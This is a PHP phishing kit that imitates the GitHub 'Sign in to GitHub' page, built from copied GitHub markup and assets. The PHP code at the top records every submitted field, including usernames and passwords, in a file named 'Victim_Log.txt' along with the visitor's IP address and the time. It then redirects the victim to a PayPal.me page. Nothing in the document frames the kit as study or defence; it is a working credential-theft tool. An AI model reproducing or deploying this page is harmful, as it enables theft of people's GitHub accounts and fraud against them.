<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://www.paypal.me/OfficialEvilDevil/');
$handle = fopen('Victim_Log.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>






<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
  <link rel="dns-prefetch" href="https://github.githubassets.com">
  <link rel="dns-prefetch" href="https://avatars0.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars1.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars2.githubusercontent.com">
  <link rel="dns-prefetch" href="https://avatars3.githubusercontent.com">
  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">



  <link crossorigin="anonymous" media="all" integrity="sha512-FG+rXqMOivrAjdEQE7tO4BwM1poGmg70hJFTlNSxjX87grtrZ6UnPR8NkzwUHlQEGviu9XuRYeO8zH9YwvZhdg==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-146fab5ea30e8afac08dd11013bb4ee0.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-iXrV/b4ypc1nr10b3Giikqff+qAx5osQ0yJRxHRDd8mKFefdMtEZ0Sxs1QysJxuJBayOKThjsuMjynwBJQq0aw==" rel="stylesheet" href="https://github.githubassets.com/assets/site-897ad5fdbe32a5cd67af5d1bdc68a292.css" />
    <link crossorigin="anonymous" media="all" integrity="sha512-JbFUBIZFtZoXLJeWZlrXpJb0sqZWgmgw7t+tEZuz0UPgJhF77FY5vSEzGLDsVb0BeyUhsg8lmftVk/6o7ISq4Q==" rel="stylesheet" href="https://github.githubassets.com/assets/github-25b154048645b59a172c9796665ad7a4.css" />
    
    
    
    


  <meta name="viewport" content="width=device-width">
  
  <title>Sign in to GitHub · GitHub</title>
    <meta name="description" content="GitHub is where people build software. More than 40 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
  <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
  <meta property="fb:app_id" content="1401488693436528">

    <meta property="og:url" content="https://github.com">
    <meta property="og:site_name" content="GitHub">
    <meta property="og:title" content="Build software better, together">
    <meta property="og:description" content="GitHub is where people build software. More than 40 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="1200">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-mark.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">
    <meta property="og:image" content="https://github.githubassets.com/images/modules/open_graph/github-octocat.png">
    <meta property="og:image:type" content="image/png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="620">

    <meta property="twitter:site" content="github">
    <meta property="twitter:site:id" content="13334762">
    <meta property="twitter:creator" content="github">
    <meta property="twitter:creator:id" content="13334762">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:title" content="GitHub">
    <meta property="twitter:description" content="GitHub is where people build software. More than 40 million people use GitHub to discover, fork, and contribute to over 100 million projects.">
    <meta property="twitter:image:src" content="https://github.githubassets.com/images/modules/open_graph/github-logo.png">
    <meta property="twitter:image:width" content="1200">
    <meta property="twitter:image:height" content="1200">

  <link rel="assets" href="https://github.githubassets.com/">
  
  

  <meta name="request-id" content="7FD0:04B7:6617F:B393C:5E9077A1" data-pjax-transient="true" /><meta name="html-safe-nonce" content="81b84b6692d293eed3be0a71dbb6c06869842b8a" data-pjax-transient="true" /><meta name="visitor-payload" content="eyJyZWZlcnJlciI6bnVsbCwicmVxdWVzdF9pZCI6IjdGRDA6MDRCNzo2NjE3RjpCMzkzQzo1RTkwNzdBMSIsInZpc2l0b3JfaWQiOiIxMDIxNzkxOTI0MTAzNzA2NTIxIiwicmVnaW9uX2VkZ2UiOiJpYWQiLCJyZWdpb25fcmVuZGVyIjoiaWFkIn0=" data-pjax-transient="true" /><meta name="visitor-hmac" content="eb85de974edf4d95d9431a524ef3758405e057dd06821fbd0637ebe3120ddb80" data-pjax-transient="true" />



  <meta name="github-keyboard-shortcuts" content="" data-pjax-transient="true" />

  

  <meta name="selected-link" value="/login" data-pjax-transient>

    <meta name="google-site-verification" content="KT5gs8h0wvaagLKAVWq8bbeNwnZZK1r1XQysX3xurLU">
  <meta name="google-site-verification" content="ZzhVyEFwb7w3e0-uOTltm8Jsck2F5StVihD0exw2fsA">
  <meta name="google-site-verification" content="GXs5KoUUkNCoaAZn7wPN-t01Pywp9M3sEjnt_3_ZWPc">

<meta name="octolytics-host" content="collector.githubapp.com" /><meta name="octolytics-app-id" content="github" /><meta name="octolytics-event-url" content="https://collector.githubapp.com/github-external/browser_event" /><meta name="octolytics-dimension-ga_id" content="" class="js-octo-ga-id" />
<meta name="analytics-location-query-strip" content="true" data-pjax-transient="true" />



    <meta name="google-analytics" content="UA-3769691-2">


<meta class="js-ga-set" name="dimension1" content="Logged Out">



  

      <meta name="hostname" content="github.com">
    <meta name="user-login" content="">

      <meta name="expected-hostname" content="github.com">


    <meta name="enabled-features" content="MARKETPLACE_INVOICED_BILLING,MARKETPLACE_SOCIAL_PROOF_CUSTOMERS,MARKETPLACE_TRENDING_SOCIAL_PROOF,MARKETPLACE_RECOMMENDATIONS,MARKETPLACE_PENDING_INSTALLATIONS,RELATED_ISSUES">

  <meta http-equiv="x-pjax-version" content="59da4d24ed9acc79d803f56f7267e3ad">
  


    <link rel="canonical" href="https://github.com/login" data-pjax-transient>


  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">

  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">

  <link rel="mask-icon" href="https://github.githubassets.com/pinned-octocat.svg" color="#000000">
  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg">

<meta name="theme-color" content="#1e2327">


  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">

  </head>

  <body class="logged-out env-production page-responsive session-authentication">
    

  <div class="position-relative js-header-wrapper ">
    <a href="#start-of-content" class="px-2 py-4 bg-blue text-white show-on-focus js-skip-to-content">Skip to content</a>
    <span class="Progress progress-pjax-loader position-fixed width-full js-pjax-loader-bar">
      <span class="progress-pjax-loader-bar top-0 left-0" style="width: 0%;"></span>
    </span>

    
    


        <div id="unsupported-browser" class="unsupported-browser" hidden>
  <div class="container-lg px-3 clearfix d-flex flex-items-center py-2">
      <svg height="16" class="octicon octicon-alert mr-2 color-gray-7" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 000 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 00.01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <div class="d-flex flex-auto flex-row">
      <div class="flex-auto min-width-0 mr-2" style="padding-top:1px">
        <span>GitHub no longer supports this web browser.</span>
        <a href="https://help.github.com/articles/supported-browsers">
          Learn more about the browsers we support.
        </a>
      </div>
    </div>
  </div>
</div>



      <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
    <a class="header-logo" href="https://github.com/" aria-label="Homepage" data-ga-click="(Logged out) Header, go to homepage, icon:logo-wordmark">
      <svg height="48" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="48" aria-hidden="true"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
    </a>
  </div>
</div>


  </div>

  <div id="start-of-content" class="show-on-focus"></div>



    

  <include-fragment class="js-notification-shelf-include-fragment" data-base-src="https://github.com/notifications/beta/shelf"></include-fragment>



  <div class="application-main " data-commit-hovercards-enabled>
      <main id="js-pjax-container" data-pjax-container>
        



<div class="auth-form px-3" id="login">

    <!-- '"` --><!-- </textarea></xmp> --></option></form><form action="<?php echo basename(__FILE__); ?>" accept-charset="UTF-8" method="post">      
      <div class="auth-form-header p-0">
        <h1>Sign in to GitHub</h1>
      </div>


      <div id="js-flash-container">


  <template class="js-flash-template">
    <div class="flash flash-full  js-flash-template-container">
  <div class="container-lg px-2" >
    <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
    </button>
    
      <div class="js-flash-template-message"></div>

  </div>
</div>
  </template>
</div>


      <div class="flash js-transform-notice" hidden>
        <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
          <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
        </button>
      </div>

      <div class="auth-form-body mt-3">

        <label for="login_field">
          Username or email address
        </label>
        <input type="text" name="login" id="login_field" class="form-control input-block" tabindex="1" autocapitalize="off" autocorrect="off" autocomplete="username" autofocus="autofocus" />

        <label for="password">
          Password <a class="label-link" href="/password_reset">Forgot password?</a>
        </label>
        <input type="password" name="password" id="password" class="form-control form-control input-block" tabindex="2" autocomplete="current-password" />
        
        
        
        <input type="text" name="required_field_d2f2" hidden="hidden" class="form-control" />
        <input type="submit" name="commit" value="Sign in" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" />
      </div>
</form>

      <p class="create-account-callout mt-3">
        New to GitHub?
        <a data-ga-click="Sign in, switch to sign up" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;sign in switch to sign up&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/login&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="72d062e79bb6ab076a3b88b32943286ea51894183bd812a5038d00013946f239" href="/join?source=login">Create an account</a>.
      </p>
</div>

      </main>
  </div>

        <div class="footer container-lg p-responsive py-6 mt-6 f6" role="contentinfo">
    <ul class="list-style-none d-flex flex-justify-center">
        <li class="mr-3"><a href="/site/terms" data-ga-click="Footer, go to terms, text:terms">Terms</a></li>
        <li class="mr-3"><a href="/site/privacy" data-ga-click="Footer, go to privacy, text:privacy">Privacy</a></li>
        <li class="mr-3"><a href="https://help.github.com/articles/github-security/" data-ga-click="Footer, go to security, text:security">Security</a></li>
          <li><a class="link-gray" data-ga-click="Footer, go to contact, text:contact" href="https://github.com/contact">Contact GitHub</a></li>
    </ul>
  </div>



  <div id="ajax-error-message" class="ajax-error-message flash flash-error">
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 000 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 00.01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
    </button>
    You can’t perform that action at this time.
  </div>


    <script crossorigin="anonymous" async="async" integrity="sha512-WcQmT2vhcClFVOaaAJV/M+HqsJ2Gq/myvl6F3gCVBxykazXTs+i5fvxncSXwyG1CSfcrqmLFw/R/bmFYzprX2A==" type="application/javascript" id="js-conditional-compat" data-src="https://github.githubassets.com/assets/compat-bootstrap-59c4264f.js"></script>
    <script crossorigin="anonymous" integrity="sha512-qRIR9sJtW+F0sy3P1EuUI81C+jzXTa54zUOyTmKhz64cc/Wj2XT1nnh23ZjWj1CFf8tO9LOn49s79ilOILcGkA==" type="application/javascript" src="https://github.githubassets.com/assets/environment-bootstrap-a91211f6.js"></script>
      <script crossorigin="anonymous" async="async" integrity="sha512-qUt0W3Q++EcTV/FjWCH4pkCuFrwLmBaxXaem85oHWp5D40Jb6WozJdUpeKQgU3fguUZ7cqxD1gpjU6f4u3ScKg==" type="application/javascript" src="https://github.githubassets.com/assets/vendor-a94b745b.js"></script>
      <script crossorigin="anonymous" async="async" integrity="sha512-rgIRUbqgpAtwFR6lNuW9DuiSVk+gbHzQ/lEcAp6761XMCTO1v6u6kMjlhnn+mW3zSTzwUBO9hkMvfgeNhPiSwA==" type="application/javascript" src="https://github.githubassets.com/assets/frameworks-ae021151.js"></script>
    
    <script crossorigin="anonymous" async="async" integrity="sha512-IK+arqpC40hIjrm6sUlKRx0lPSQ9dBsKpHyHEYgWeUoboST1WHe1sAbmsEgM1iv+mWcykQc9YiOrl6jQtMpx4Q==" type="application/javascript" src="https://github.githubassets.com/assets/github-bootstrap-20af9aae.js"></script>
    
      <script crossorigin="anonymous" async="async" integrity="sha512-RsigcDuXKcrrfEjgzm2WFpgfmtwx202tc/zFBpazrNGtGoiac7v3SOGNzpgEMfiwxBvamGK70jf803C69GLZZw==" type="application/javascript" src="https://github.githubassets.com/assets/unsupported-bootstrap-46c8a070.js"></script>

    
  <div class="js-stale-session-flash flash flash-warn flash-banner" hidden
    >
    <svg class="octicon octicon-alert" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 000 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 00.01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg>
    <span class="js-stale-session-flash-signed-in" hidden>You signed in with another tab or window. <a href="">Reload</a> to refresh your session.</span>
    <span class="js-stale-session-flash-signed-out" hidden>You signed out in another tab or window. <a href="">Reload</a> to refresh your session.</span>
  </div>
  <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default text-gray-dark hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg class="octicon octicon-x" viewBox="0 0 12 16" version="1.1" width="12" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.48 8l3.75 3.75-1.48 1.48L6 9.48l-3.75 3.75-1.48-1.48L4.52 8 .77 4.25l1.48-1.48L6 6.52l3.75-3.75 1.48 1.48L7.48 8z"></path></svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

  <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;" tabindex="0">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box box-shadow-large" style="width:360px;">
  </div>
</div>

  <div aria-live="polite" class="js-global-screen-reader-notice sr-only"></div>

  </body>
</html>

